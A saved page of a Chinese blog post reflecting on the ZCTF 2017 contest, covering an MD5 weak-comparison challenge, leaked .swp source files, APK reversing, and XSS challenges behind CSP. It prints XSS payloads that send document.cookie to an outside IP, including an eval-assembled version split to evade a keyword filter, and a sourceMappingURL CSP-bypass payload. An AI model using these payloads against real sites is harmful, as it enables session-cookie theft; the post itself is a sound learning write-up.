@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
+<title>ZCTF2017打到心态爆炸后的反思 – Wupco's Blog</title>
+<script src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/jquery.jsver=1.12.4" type="text/javascript"></script>
+<script src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/jquery-migrate.min.jsver=1.4.1" type="text/javascript"></script>
+<link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/rest_route=" rel="https://api.w.org/"/>
+<link href="http://www.wupco.cn/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/p=1437" rel="prev" title="SQLMAP|阅读手记三{“三测”、开始注入}"/>
+<link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/p=2087" rel="next" title="SQLMAP|阅读手记四{conf.dbmsHandler，conf.dumper}"/>
+<link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/p=1451" rel="canonical"/>
+<link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/p=1451" rel="shortlink"/>
+<script src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/shCore.js" type="text/javascript"></script><link href=" http://www.wupco.cn/wp-content/plugins/wp-ueditor2/ueditor/third-party/SyntaxHighlighter/shCoreDefault.css" rel="stylesheet" type="text/css"/><link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="icon" sizes="32x32"/>
+<link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="icon" sizes="192x192"/>
+<link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="apple-touch-icon-precomposed"/>
+<meta content="http://www.wupco.cn/wp-content/uploads/2016/11/R5K8RH7ACHA7KEV8P.gif" name="msapplication-TileImage">
+<link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/favicon.png" rel="shortcut icon" type="image/vnd.microsoft.icon"/>
+<link href="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/style.css" rel="stylesheet" type="text/css">
+<!--[if lt IE 9]>
+<script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script>
+<script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+</link></meta></head>
+<body>
+<div class="container" id="main">
+<div class="pjax">
+<header id="header">
+<div class="container">
+<h1 class="logo">
+<i class="iconfont"></i><a href="http://www.wupco.cn">Wupco's Blog</a>
+</h1>
+<nav class="menu_click" id="topMenu">
+<div class="menu-menu-1-container"><ul class="menu" id="menu-menu-1"><li><a href="http://www.wupco.cn/">首页</a></li>
+<li><a href="http://www.wupco.cn/?page_id=1174">关于我</a></li>
+<li><a href="http://www.wupco.cn/?page_id=1448">数据备份</a></li>
+<li><a href="http://www.wupco.cn/?page_id=1959">CTF备忘录</a></li>
+</ul></div><i class="i_1"></i>
+<i class="i_2"></i>
+</nav>
+</div>
+</header>
+<section class="blockGroup">
+<h2 class="s_title" itemprop="name headline">ZCTF2017打到心态爆炸后的反思</h2>
+<article class="post single" itemscope="" itemtype="http://schema.org/BlogPosting">
+<p><span style="font-family:微软雅黑, Microsoft YaHei">     这个寒假很松懈，没有多练习，开学的伊始我就产生了不好的预感。首先是我要弄个一键备份的功能需要写一个python脚本，各种卡壳，然后一怒之下写php，结果居然和python混淆了....混淆了.....混淆了.......</span></p>
+<p><span style="font-family:微软雅黑, Microsoft YaHei">     然后去华为为老师做点事，在内网看到一篇写的很好的安全文章，瞬间发现自己少了很多灵性。我觉得做安全，尤其是Web方向最忌讳的就是偷懒，安全就是在不断变革，不能跟上时代就会被淘汰。</span></p>
+<p><span style="font-family:微软雅黑, Microsoft YaHei">     这次ZCTF第一道Web100，拿到手各路信息收集了无果后先FUZZ了一下目录（包括swp,swo,swn等文件泄露），然后还是没什么收获，这时师傅已经FUZZ到了1.php是phpinfo页面（我居然没FUZZ到......是时候更新一下脚本了），大致看了一下phpinfo，看到了openssl，看到版本不是心脏出血，又看到是php7+opcache，看了一下<a _src="http://www.52bug.cn/post-1129.html" href="http://www.52bug.cn/post-1129.html">http://www.52bug.cn/post-1129.html</a> </span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>需要有个任意文件上传，想到是100分题不可能这么复杂，瞬间又没思路了。这时师傅又FUZZ到了swp文件泄露.......</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>我当时明明试过了啊喂(#`O′)，有点怀疑是官方刚开始忘了给.......于是拿到了源码。</span></p>
+<pre class="brush:php;toolbar:false">$flag = $_GET['flag'];
+if ($flag != '15562') {
+	if (strstr($flag, 'zctf')) {
+		if (substr(md5($flag),8,16) == substr(md5('15562'),8,16)) {
+			die('ZCTF{#########}');
+		}
+	}
+}</pre>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'></span>  <span style='font-family: 微软雅黑, "Microsoft YaHei";'>发现是md5碰撞，1556加密后的第8位开始又是0e，所以找一个同样第八位开始是0e的利用php弱类型判断就好，刚好有个碰撞md5某些位数的脚本...改了一下进行碰撞.....跑了半天没结果......发现是位数搞错了.....我忘记了php的8，16代表的是从第八位到二十四位，而不是第八位到第十六位......这时候俊杰师傅已经碰撞到了.......</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><br/></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>       第二题应该是个xss，只有contact.php是动态的，而且在师傅的提醒下，发现上了CSP，这个倒也不难，准备撸payload时候发现拦截了非法字符等等(刚开始以为是textarea XSS)，试了很多，大概猜到黑名单了，这时候我灵机一动，查看了一下.message.php.swp，居然真的有备份文件！！！</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'> </span></p>
+<pre class="brush:php;toolbar:false">&lt;?php
+require_once('global.db.php'); 
+function check_input($s,$type){
+    if ($type=='ltext'){
+        if (strlen($s)&gt;180){
+            Alert('message too long!');
+        }
+    }
+    else if ($type == 'email'){
+        if (!preg_match("/^\w{2,12}@\w{1,4}\.com$/s",$s)){
+            Alert("email error!");
+        }
+    }
+    else {
+        if (strlen($s)&gt;40){
+            Alert("$type too long !");
+        }
+        else if (strlen($s)&lt;5){
+            Alert("$type too short !");
+        }
+    }
+    return $s;
+}
+
+function merge($a,$b,$c,$d){
+    if (strlen($a)&gt;0 &amp;&amp; strlen($b)&gt;0 &amp;&amp; strlen($c)&gt;0 &amp;&amp; strlen($d)&gt;0)
+        return array($a,$b,$c,$d);
+    else{
+        Alert('something empty!');
+        exit();
+    }
+}
+
+function filter($s){
+	$ok = "0123456789abcdefghijklmnokpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&lt;&gt;/@=.: ";
+	$f = "frame|document|src|open|eval|string|autofocus|function|location|innerhtml|link|img|src|svg|onload|onerror|data|body|alert|confirm|prompt|rel|pregconnect|prefetch|history|back|navigate|navigate|href|onabort|onblur|onchange|onfocus|onkeydown|onmousedown|onsubmit|onunload|onselect|window|get|post|request|query";
+	for ($i=0;$i&lt;strlen($s);$i++){
+		if (!strchr($ok,$s[$i]))
+			Alert("char Invalid!");
+	}
+        if (preg_match("/".$f."/is",$s)){
+		Alert("string Invalid!");
+        }
+	return $s;
+}
+
+if ($_SERVER['REQUEST_METHOD']=='POST'){
+    @$user = check_input($_POST['Name'],'name');
+    @$email = check_input($_POST['Email'],'email');
+    @$team = check_input($_POST['Team'],'team');
+    @$message = filter(check_input($_POST['textarea'],'ltext'));
+    $KEY = array('name','email','team_key','message');
+    $MSG = merge($user,$email,$team,$message);
+    $DB-&gt;insert($KEY,$MSG,'message');
+    Alert('Success!');
+}
+else Alert('Error!');
+?&gt;</pre>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>      但是拿到源码对于我来说也没什么用了....因为黑名单我都差不多猜出来了，但是没想到对一些标签还有这么严格的过滤，看了一下应该没办法绕过了.....于是准备在name和team两个字段XSS。可惜又有长度限制，而绕过CSP unsafeline的payload......都不够短.......</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>举个例子....</span></p>
+<pre class="brush:js;toolbar:false;">&lt;script&gt;var n=document.createElement("link");n.setAttribute("rel", "prefetch");n.setAttribute("href",
+ "//123.206.216.198/?msg=" + escape(document.cookie));document.head.appendChild(n);&lt;/script&gt;</pre>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'></span><span style='font-family: 微软雅黑, "Microsoft YaHei";'>最短的也是window.location，试了一下并打不到bot，这都是后话了</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>我最开始想的是上面那个payload分条</span></p>
+<pre class="brush:js;toolbar:false">var stt="var n=doc"
+stt=stt+"ument.creat"
+stt=stt+"eElement('l"
+stt=stt+"ink');n.set"
+stt=stt+"Attribute('"
+stt=stt+"rel','prefe"
+stt=stt+"tch');n.set"
+stt=stt+"Attribute('"
+stt=stt+"href','//12"
+stt=stt+"3.206.216.1"
+stt=stt+"98/?msg='+"
+stt=stt+"escape(document.co"
+stt=stt+"okie));docum"
+stt=stt+"ent.head.ap"
+stt=stt+"pendChild(n"
+stt=stt+");"
+eval(stt)</pre>
+<pre class="brush:js;toolbar:false">&lt;script&gt;var+p%3d%22var+n%3ddoc%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22ument.creat%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22eElement(%27l%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22ink%27)%3bn.set%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22Attribute(%27%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22rel%27%2c%27prefe%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22tch%27)%3bn.set%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22Attribute(%27%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22href%27%2c%27%2f%2f12%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%223.206.216.1%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%2298%2f%3fmsg%3d%27%2b%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22escape(%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22document.co%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22okie))%3bdocum%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22ent.head.ap%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22pendChild(n%22;&lt;/script&gt;
+&lt;script&gt;p%3dp%2b%22)%3b%22;&lt;/script&gt;
+&lt;script&gt;eval(p);&lt;/script&gt;</pre>
+<p><span id="docs-internal-guid-c2b9b5c7-7ae7-4b85-a3aa-bd5998f65d2d"><span style="font-size: 12pt; font-family: Verdana; color: rgb(34, 34, 34); background-color: rgb(255, 255, 255); vertical-align: baseline; white-space: pre-wrap;"><img height="216" src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/OgHH6ujgBxsz34pkeSynhVBKCdoy-cwwdAKF9yr_4HGmQdo3N7WaCZax5QSSASi80gIwCoUICqPpE7OEwPQpeDIBmBTOHUtqll4LLV5tQbkt2tuNWoF4scHAOmVvz3M66YTzWiTu" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" width="604"/></span></span></p>
+<p><span style='font-size: 12pt; color: rgb(34, 34, 34); background-color: rgb(255, 255, 255); vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>   打过去好几梭子都没反应......</span></p>
+<p><span style="color:#222222;font-family:微软雅黑, Microsoft YaHei"><span style="white-space: pre-wrap; background-color: rgb(255, 255, 255);">   最后好像还X到了队友.....</span></span></p>
+<p><span style="color:#222222;font-family:微软雅黑, Microsoft YaHei"><span style="white-space: pre-wrap; background-color: rgb(255, 255, 255);">   <span id="docs-internal-guid-c2b9b5c7-7ae7-e50e-66ca-6850b76cb603"><span style="font-size: 9pt; font-family: Verdana; background-color: rgb(255, 255, 255); text-decoration: line-through; vertical-align: baseline; white-space: pre-wrap;"><img height="49" src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/_E7j2xOZMTX72XgRYs7V3jtxnyK409UVoAiFM7twTU9w4JOWGEPkciaZKu__Lk1Dpb5fKRxTTINjFWIwCrUOWgFu_Rl2BH5YqxJVUkJmwwKDOVHuLpCohlyKrnskp5ZFwV40keQS" style="border: none; transform: rotate(0rad); width: 1179px; height: 42px;" width="1274"/></span></span></span></span></p>
+<p> <span style='font-family: 微软雅黑, "Microsoft YaHei";'>不得不承认自己很菜，也止步至此了.......</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><br/></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>  再说说Web200，APK解包后，逆向java发现调用so库来加密，又逆向了so库，找到那个函数然而看不懂逻辑....想调试这个so库又没有安卓环境（试过java和c 都说缺少了liblog.so）</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>  c写了一个 strace一下发现</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><img src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/46_LXMIM97O5G8LMFL.jpg"/></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><br/></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>java写了发现</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><br/></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><img src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/4KERC9OQMUUQR667_Y.jpg"/></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>     很难受....最终还是师傅安装了安卓环境调用了函数进行注入测试，得到了账号密码后因师傅在出差就这么不了了之了</span></p>
+<p></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>    Web400如果没猜错也是XSS，我猜是提交漏洞的时候会被我的昵称X到，但实际上还是没有X到.......</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>    另外这道不能引用外部js也是很扎心，内部的上传倒是可以上传jpg结尾的js，但太长了... 超过了nick的长度限制</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>    最后用的window.location大法，虽然X到了自己，但并不知如何X到bot，这次比赛我就这样心态炸了</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><span id="docs-internal-guid-c2b9b5c7-7aed-e574-20e4-ad22d84c5961"><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="275" src="https://lh4.googleusercontent.com/Id0k2yyz1FkGoNueRyhV3gTpL2NieKVXtLcTf729zWug9UJNHL616mEhB4xsI1Ieblmi8sNMRhHUUn-CYEU7qgqaTb5pVHmjhUuUcKNdynifhMUn4-a0ZWfRH0qgErofdoMo42x-" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" width="604"/></span></span></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><br/></span></span></p>
+<p><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;">      <span style='font-size: 11pt; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>比赛一直持续到26号18点，但我13点的时候就关掉了所有的页面和工具。真的是懵逼了，我需要冷静，但这时摆在我面前的是我已经老大不小了，还有一年就毕业了，现在这样怎么找到工作？</span></span></p>
+<p><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><span style='font-size: 11pt; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>     最后和肖老师谈话，学到新姿势：比赛运维如果中途修改代码的话马上开始无限访问.swp，一般运维人员都会用vim，所以不可避免会泄露源码，当时Web400运维好像就中途修改代码报错了....</span></span></p>
+<p><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><span style='font-size: 11pt; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>    <img src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/1A09JZU8OU49@NXROS.png"/></span></span></p>
+<p><span style="font-size: 11pt; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><span style='font-size: 11pt; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>     总该恢复正常，明天开始继续读sqlmap，不积跬步无以至千里。下一站XCTF再会！</span></span></p>
+<p></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>    看了<a href="http://bobao.360.cn/ctf/detail/186.html" target="_blank">FlappyPig师傅们的WP</a>，我想简单的反思一下。</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>    第一个Web100没什么好说的了。</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>    第二个<strong><span style="font-family: 微软雅黑, 'Microsoft YaHei'; text-indent: 2em; font-size: 18px;">Web-Find my eyes</span></strong></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><strong><span style="font-family: 微软雅黑, 'Microsoft YaHei'; text-indent: 2em; font-size: 18px;">    </span></strong><span style='font-family: 微软雅黑, "Microsoft YaHei"; text-indent: 2em; font-size: 16px;'>最终payload是</span></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-family: 微软雅黑, "Microsoft YaHei"; text-indent: 2em; font-size: 16px;'>    </span></span></p>
+<pre class="brush:js;toolbar:false">&lt;/textarea&gt;&lt;script&gt;var a=1//@ sourceMappingURL=//xss.site&lt;/script&gt;</pre>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei"; text-indent: 2em; font-size: 16px;'></span>  <span style='font-family: 微软雅黑, "Microsoft YaHei";'>利用sourceMappingURL在FIREFOX和CHROME下可以绕过CSP，第一次见这个payload是长短短师傅发的，</span><span style='font-family: 微软雅黑, "Microsoft YaHei";'></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>   当时确实记了下来，比赛过程中也想到用这个试一试了。</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>    <img src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/QQ图片20170228222127.png" title="QQ图片20170228222127.png"/></span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>  但是可能是当时XSS平台的问题，当时提交这个payload用的是短链接的webxss.net，不是自己搭建的，所以出了变故，果然一失足成千古恨。不过比赛就是这样，当时只是记着这个payload，没有实践过，所以心里没底，就没有多试一下。</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>   第三个APP的，利用了最近炒的非常火热的phpmailer漏洞 <a href="https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html" target="_blank" textvalue="CVE-2016-10033">CVE-2016-10033</a>，因为自己没有做这道题，所以不妄加评论。</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>   第四道Web400，在漏洞链接那里可以X到bot（这个我没有试到），让bot修改个人信息，然后利用上面那个selfxss返回信息回来，最终是要读取其中的一个tag。（这个思路在pwnhub有一期和这类似）</span></p>
+<p><span style='font-family: 微软雅黑, "Microsoft YaHei";'>   不得不说这次题目相当不错，也暴露了自己的弱点，只能再接再厉了。</span></p>
+</article>
+<section class="ending">
+<ul class="sns">
+<li class="tencent"><a href="http://wpa.qq.com/msgrd?v=3&amp;uin=827977014&amp;site=qq&amp;menu=yes" target="_blank"><i class="iconfont"></i></a></li>
+<li class="zhihu"><a href="https://www.zhihu.com/people/wupco " target="_blank"><i class="iconfont"></i></a></li>
+</ul>
+<div class="reward">
+                打
+                <ul>
+<li><img src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/QQ图片20170222193616.png"/>用支付宝打我</li>
+<li><img src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/QQ图片20170222193616.png"/>用微信打我</li>
+</ul>
+</div>
+<div class="about">
+<img alt="" class="avatar avatar-80 photo" height="80" src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/cd0d984309c15bd1f668df0d0343eccds=80&amp;d=mm&amp;r=g" srcset="http://cn.gravatar.com/avatar/cd0d984309c15bd1f668df0d0343eccd?s=160&amp;d=mm&amp;r=g 2x" width="80"> <p></p>
+</img></div>
+</section>
+<!-- You can start editing here. -->
+<!-- If comments are open, but there are no comments. -->
+<div class="comment-respond" id="respond">
+<h3 class="comment-reply-title" id="reply-title">发表评论 <small><a href="/?p=1451#respond" id="cancel-comment-reply-link" rel="nofollow" style="display:none;">取消回复</a></small></h3> <form action="http://www.wupco.cn/wp-comments-post.php" class="comment-form" id="commentform" method="post">
+<p class="comment-notes"><span id="email-notes">电子邮件地址不会被公开。</span> 必填项已用<span class="required">*</span>标注</p><p class="comment-form-comment"><label for="comment">评论</label> <textarea aria-required="true" cols="45" id="comment" maxlength="65525" name="w" required="required" rows="8"></textarea><textarea cols="100%" name="comment" rows="4" style="display:none"></textarea></p><p class="comment-form-author"><label for="author">姓名 <span class="required">*</span></label> <input aria-required="true" id="author" maxlength="245" name="author" required="required" size="30" type="text" value=""/></p>
+<p class="comment-form-email"><label for="email">电子邮件 <span class="required">*</span></label> <input aria-describedby="email-notes" aria-required="true" id="email" maxlength="100" name="email" required="required" size="30" type="text" value=""/></p>
+<p class="comment-form-url"><label for="url">站点</label> <input id="url" maxlength="200" name="url" size="30" type="text" value=""/></p>
+<p class="form-submit"><input class="submit" id="submit" name="submit" type="submit" value="发表评论"/> <input id="comment_post_ID" name="comment_post_ID" type="hidden" value="1451"/>
+<input id="comment_parent" name="comment_parent" type="hidden" value="0"/>
+</p> </form>
+</div><!-- #respond -->
+</section>
+<div class="clearer"></div>
+<nav class="navigator">
+</nav>
+</div>
+</div>
+<div class="clearer"></div>
+<div class="search">
+<form action="http://www.wupco.cn" method="get">
+<input autocomplete="off" class="search_key" name="s" placeholder="Enter search keywords..." required="required" type="text" value=""/>
+<button alt="Search" type="submit">Search</button>
+</form>
+</div>
+<footer id="footer">
+<section class="links_adlink">
+<ul class="container">
+</ul>
+</section>
+友情链接:<a href="http://www.hazzel.cn">Hazzel师傅</a> <a href="http://www.yqxiaojunjie.com/">俊杰师傅</a> <a href="http://margular.github.io">sunshine</a> <a href="https://3wapp.github.io/">janes师傅</a><br/> <a href="http://www.au1ge.xyz/">au1ge</a><br/>
+© 2017 <a href="http://www.wupco.cn">Wupco's Blog</a>
+<a class="back2top"></a>
+</footer>
+<script type="text/javascript">SyntaxHighlighter.all();</script><script type="text/javascript">
+/* <![CDATA[ */
+var ajaxcomment = {"ajax_url":"http:\/\/www.wupco.cn\/wp-admin\/admin-ajax.php","order":"asc","formpostion":"top"};
+/* ]]> */
+</script>
+<script src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/app.jsver=20141010" type="text/javascript"></script>
+<script style="display:none">
+function index_overloaded(){
+
+}
+</script>
+<script src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/jquery.min.js"></script>
+<script src="./ZCTF2017打到心态爆炸后的反思 – Wupco's Blog/functions.js"></script>
+<script>
+</script>
+</body>
+</html>
